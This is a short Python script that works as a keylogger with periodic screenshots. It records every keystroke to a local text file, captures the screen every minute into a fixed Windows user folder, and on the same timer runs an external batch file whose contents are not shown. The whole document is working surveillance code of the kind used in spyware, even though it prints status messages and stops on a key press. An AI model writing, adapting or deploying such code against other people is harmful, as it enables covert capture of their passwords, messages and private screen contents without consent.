import time
import threading
import pyautogui
from pynput import keyboard
import subprocess
import os
from datetime import datetime

log_file = "write.txt"
exit_key = keyboard.Key.f6

def on_press(key):
    global listener
    try:
        if key == keyboard.Key.space:
            key_str = " "
        elif key == keyboard.Key.enter:
            key_str = "\n"
        elif key == keyboard.Key.backspace:
            key_str = " [BACKSPACE] "
        elif key == keyboard.Key.tab:
            key_str = "\t"
        elif key == exit_key:
            print("\n[LOGGING STOPPED]")
            listener.stop()
            return
        else:
            key_str = key.char
    except AttributeError:
        key_str = f"[{key.name}]"

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(key_str)

def take_screenshot():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_path = f"C:/Users/K12/Downloads/1/{timestamp}.png"

    if not os.path.exists("C:/Users/K12/Downloads/1"):
        os.makedirs("C:/Users/K12/Downloads/1")

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    print(f"Screenshot saved as {screenshot_path}")

def run_repeat_bat():
    while True:
        time.sleep(60)
        take_screenshot()
        subprocess.run([r"D:/repeat.bat"], shell=True)

repeat_thread = threading.Thread(target=run_repeat_bat, daemon=True)
repeat_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
